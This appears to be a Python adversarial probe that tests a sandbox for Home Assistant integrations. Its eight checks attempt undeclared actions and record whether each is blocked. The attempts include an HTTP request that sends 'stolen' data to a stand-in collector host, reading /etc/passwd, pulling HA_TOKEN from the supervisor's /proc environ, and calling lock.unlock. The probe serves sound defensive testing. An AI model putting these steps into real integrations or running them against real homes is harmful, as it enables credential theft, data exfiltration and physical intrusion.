"""Adversarial probe: what a malicious version of this integration would try.

Runs inside the sandbox after the real integration has set up successfully, over
the same manifest and the same bridge. Nothing here is exotic — each of these is
a single line an integration author could add to a legitimate integration, and
on stock Home Assistant every one of them succeeds today.

Some checks are expected to FAIL to be blocked, and say so. Reporting that
honestly is the point of running the probe at all — checks 5 through 8 were each
written while they still failed, which is what made every before/after a
measurement rather than an assertion.

Current state: 4 of 8 blocked as an ordinary child process, **8 of 8** under
`supervisor.py --isolate` (user + PID + mount namespaces, allowlisted root,
seccomp filter, and supervisor-brokered egress).

Checks 7 and 8 were the last to close, on 2026-08-14. The `network:` allowlist
used to be enforced in the shim's HTTP client, which asked the supervisor and
then let *this* process open the connection — so a raw socket never consulted
it. Now seccomp denies `socket(AF_INET)` and all HTTP is performed by the
supervisor over the bridge, so the allowlist binds regardless of intent. See
RESULTS_2026-08-14_egress_broker.md.

What none of this touches: exfiltration through a host the manifest legitimately
declares. An allowlist governs destination, not content.
"""

from __future__ import annotations

import errno
import os
import socket

from homeassistant._bridge import PermissionDenied
from homeassistant.core import HomeAssistant
from homeassistant.helpers.aiohttp_client import async_get_clientsession

TARGET_LOCK = "lock.front_door"
EXFIL_HOST = "collector.exfil-example.net"
SECRETS_PATH = "/etc/passwd"  # stands in for /config/secrets.yaml on a real host
# Checks 7 and 8 use IP literals rather than hostnames, deliberately.
# socket.create_connection() resolves a name before it opens a socket, so a
# hostname target fails with gaierror and never reaches the layer being tested —
# and gaierror looks identical whether the name does not exist or the sandbox
# has no network at all. An address removes the confound: what is measured is
# the socket call, which is where the control actually sits.
# Both are RFC 5737 documentation ranges, so the probe never touches anything
# real, on the LAN or otherwise.
LAN_DEVICE = "192.0.2.10"  # TEST-NET-1: a lock's local API, a camera, the router
EXFIL_ADDR = "198.51.100.10"  # TEST-NET-2: a collector on the internet


async def run_probe(hass: HomeAssistant) -> list[tuple[str, bool, str]]:
    """Attempt eight undeclared actions; return (name, blocked, detail)."""
    results: list[tuple[str, bool, str]] = []
    print("\nsandbox: running adversarial probe", flush=True)

    # 1. Read one entity it never declared — occupancy, locks, cameras.
    try:
        state = hass.states.get(TARGET_LOCK)
        results.append(("read undeclared entity", False, f"got {state}"))
    except PermissionDenied as err:
        results.append(("read undeclared entity", True, str(err)))

    # 2. The firehose: ask for every state in the house at once.
    try:
        states = hass.states.async_all()
        leaked = [state.entity_id for state in states if not state.entity_id.startswith("sensor.andrews_arnold")]
        results.append(
            (
                "enumerate whole house",
                not leaked,
                f"{len(states)} returned, {len(leaked)} belonging to others",
            )
        )
    except PermissionDenied as err:
        results.append(("enumerate whole house", True, str(err)))

    # 3. Confused deputy: make the privileged side act on the attacker's behalf.
    try:
        await hass.services.async_call("lock", "unlock", {"entity_id": TARGET_LOCK})
        results.append(("call lock.unlock", False, "service call went through"))
    except PermissionDenied as err:
        results.append(("call lock.unlock", True, str(err)))

    # 4. Exfiltrate to a host that is not in the allowlist.
    session = async_get_clientsession(hass)
    try:
        await session.get(f"https://{EXFIL_HOST}/collect?data=stolen")
        results.append(("exfiltrate to undeclared host", False, "request was issued"))
    except PermissionDenied as err:
        results.append(("exfiltrate to undeclared host", True, str(err)))
    except Exception as err:  # noqa: BLE001 - DNS failure is not a security control
        results.append(("exfiltrate to undeclared host", False, f"allowed by policy, failed in transit: {type(err).__name__}"))

    # 5. Read a host file directly, bypassing the shim entirely.
    try:
        with open(SECRETS_PATH, encoding="utf-8") as handle:
            handle.readline()
        results.append(
            ("read host filesystem", False, f"{SECRETS_PATH} readable — run with --isolate")
        )
    except OSError as err:
        results.append(("read host filesystem", True, str(err)))

    # 6. Steal the supervisor's credential out of /proc and skip the bridge
    #    entirely. See FINDINGS_2026-08-14_token_leak.md: this is the attack
    #    that defeats the manifest without attacking it, because the supervisor
    #    is never asked and the audit log never sees it.
    parent = os.getppid()
    try:
        with open(f"/proc/{parent}/environ", "rb") as handle:
            blob = handle.read()
        holds_token = b"HA_TOKEN=" in blob
        results.append(
            (
                "read supervisor's /proc",
                False,
                f"/proc/{parent}/environ readable"
                + (" — CONTAINS HA_TOKEN" if holds_token else " (no token set this run)"),
            )
        )
    except OSError as err:
        results.append(("read supervisor's /proc", True, str(err)))

    # 7 and 8. Reach a device the manifest never declared, without going
    #    through the shim's mediated session.
    #
    #    Exfiltration (8) is the obvious reading. The sharper one is lateral
    #    movement (7): LAN_DEVICE stands for a smart lock's local HTTP API, a
    #    camera, or a router admin page — none of which need HA's credential,
    #    so closing every token route did nothing about them. Confining lateral
    #    movement is the manifest's central promise, and these are the checks
    #    that say whether it is kept.
    #
    #    Both were ALLOWED until 2026-08-14, because the allowlist was checked
    #    inside aiohttp_client and the sandbox then opened the socket itself.
    #    Now seccomp denies socket(AF_INET), so there is no socket to open and
    #    the only exit is the supervisor.
    #
    #    "Blocked" here means the *socket call* was refused, not that nothing
    #    answered: a connection failing on DNS or routing is not a control.
    for label, host, port in (
        ("undeclared LAN device", LAN_DEVICE, 80),
        ("undeclared internet host", EXFIL_ADDR, 80),
    ):
        try:
            connection = socket.create_connection((host, port), timeout=2)
            connection.close()
            results.append((f"raw socket → {label}", False, f"connected to {host}, unmediated"))
        except OSError as err:
            # Distinguish a *refused syscall* from a request that merely failed
            # to arrive. Only the first is a control: a connection dying on DNS
            # or a timeout would have succeeded against a reachable target.
            # seccomp reports the denied socket family as EAFNOSUPPORT; a plain
            # errno filter would report EPERM/EACCES.
            if err.errno in (errno.EAFNOSUPPORT, errno.EPERM, errno.EACCES):
                results.append(
                    (
                        f"raw socket → {label}",
                        True,
                        f"socket refused by syscall filter ({errno.errorcode.get(err.errno)})",
                    )
                )
            else:
                results.append(
                    (
                        f"raw socket → {label}",
                        False,
                        f"unmediated by policy, failed in transit: {type(err).__name__}",
                    )
                )

    print("\nsandbox: probe results")
    for name, blocked, detail in results:
        mark = "BLOCKED" if blocked else "ALLOWED"
        print(f"  [{mark}] {name:<32} {detail}", flush=True)

    return results
